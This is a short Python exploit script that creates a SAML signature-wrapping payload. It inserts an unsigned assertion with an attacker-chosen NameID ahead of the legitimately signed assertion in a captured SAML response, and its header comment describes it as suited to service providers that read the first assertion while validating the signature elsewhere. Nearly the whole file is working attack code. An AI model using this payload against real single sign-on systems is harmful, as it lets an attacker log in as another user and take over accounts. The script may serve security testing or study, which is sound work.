# Use this when the SP takes the first assertion and doesn't care about the signature reference
#!/usr/bin/env python3

from pathlib import Path
from copy import deepcopy
from lxml import etree


INPUT = Path("response.xml")
OUTPUT = Path("payload.xml")

ATTACKER_EMAIL = "admin@libcurl.so"


def main():
    if not INPUT.exists():
        raise FileNotFoundError("response.xml not found")

    parser = etree.XMLParser(remove_blank_text=False)
    tree = etree.parse(str(INPUT), parser)
    root = tree.getroot()

    # Find the existing Assertion.
    assertions = [
        child
        for child in root
        if etree.QName(child).localname == "Assertion"
    ]

    if not assertions:
        raise RuntimeError("No Assertion found in response.xml")

    signed_assertion = assertions[0]

    # Create an unsigned assertion.
    #
    # Intentionally keep this simple/unsigned. The vulnerable application
    # is expected to read the first NameID it encounters while signature
    # verification validates the legitimate assertion below it.
    attacker_assertion = etree.Element(
        "Assertion",
        ID="whatever_you_want",
    )

    subject = etree.SubElement(attacker_assertion, "Subject")
    name_id = etree.SubElement(subject, "NameID")
    name_id.text = ATTACKER_EMAIL

    # Insert the malicious assertion immediately before the legitimate one.
    index = root.index(signed_assertion)
    root.insert(index, attacker_assertion)

    # Write the wrapped response.
    tree.write(
        str(OUTPUT),
        encoding="UTF-8",
        xml_declaration=True,
        pretty_print=False,
    )

    print("[+] SAML wrapping payload created")
    print(f"[+] Input : {INPUT}")
    print(f"[+] Output: {OUTPUT}")
    print(f"[+] NameID: {ATTACKER_EMAIL}")
    print()
    print("[+] Assertion order:")
    print("    1. Unsigned Assertion ->", ATTACKER_EMAIL)
    print("    2. Original signed Assertion -> unchanged")


if __name__ == "__main__":
    main()